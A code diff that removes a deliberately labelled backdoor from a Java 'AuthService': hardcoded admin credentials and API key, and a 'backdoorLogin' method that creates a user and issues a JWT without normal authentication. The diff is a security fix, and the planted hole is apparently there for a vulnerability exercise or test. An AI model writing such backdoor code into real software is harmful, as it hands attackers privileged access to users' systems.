@@ -261,39 +261,4 @@ public class AuthService {
         logger.info("Vérification de l'existence du nom d'utilisateur: {}", username);
         return userRepository.findByUsername(username).isPresent();
     }
-
-    // VULNÉRABILITÉ: Hardcoded credentials pour backdoor admin
-    private static final String BACKDOOR_USERNAME = "superadmin";
-    private static final String BACKDOOR_PASSWORD = "BackdoorPass123!@#";
-    private static final String BACKDOOR_API_KEY = "sk-backdoor-admin-key-2024-secret";
-
-    /**
-     * VULNÉRABILITÉ: Backdoor login bypassing normal authentication
-     * Permet de se connecter avec des credentials hardcoded
-     */
-    public AuthResponse backdoorLogin(String username, String password) {
-        logger.info("Backdoor login attempt for user: {}", username);
-        
-        if (username.equals(BACKDOOR_USERNAME) && password.equals(BACKDOOR_PASSWORD)) {
-            User user = userRepository.findByUsername(username)
-                .orElseGet(() -> {
-                    // Créer l'utilisateur backdoor s'il n'existe pas
-                    User backdoorUser = User.builder()
-                        .username(username)
-                        .password(passwordEncoder.encode(password))
-                        .userRoles(new HashSet<>())
-                        .build();
-                    return userRepository.save(backdoorUser);
-                });
-            
-            var token = jwtService.generateToken(user);
-            logger.warn("Backdoor login successful for: {}", username);
-            
-            return AuthResponse.builder()
-                .token(token)
-                .build();
-        }
-        
-        throw new RuntimeException("Invalid backdoor credentials");
-    }
 } 
